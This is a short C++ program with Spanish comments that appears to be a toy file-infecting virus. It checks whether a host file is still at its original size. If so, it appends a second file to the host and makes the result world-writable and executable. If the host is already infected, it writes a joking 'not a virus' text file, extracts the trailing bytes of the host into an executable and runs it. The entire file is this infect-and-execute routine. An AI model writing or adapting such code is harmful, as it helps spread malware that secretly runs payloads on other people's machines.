#include <bits/stdc++.h>

using namespace std;

int fileSize(const char *add)
{
    ifstream mySource;
    mySource.open(add, ios_base::binary);
    mySource.seekg(0,ios_base::end);
    int size = mySource.tellg();
    mySource.close();
    return size;
}

int main()
{
    long long int tam=fileSize("1");
    string tmp;

    cout<<"LOOK : "<<tam<<endl;
    if(tam==11992  ) ///SI NO INFECTO A NADIE
    {
        system("cat 1 2 > 3");
        system("mv 3 1");
		system("chmod 777 1");
		return 0;
    }

    else /// SI YA INFECTO A ALGUIEN
    {
        ofstream out;
        tmp="totally not a virus, trust me :) ";
        out.open("im not a virus.txt");
        out<<tmp;
        out.close();
		system("tail 1 -c 29840  > exec");
		system("chmod 777 exec");
		system("./exec");
    }
    return 0;
}
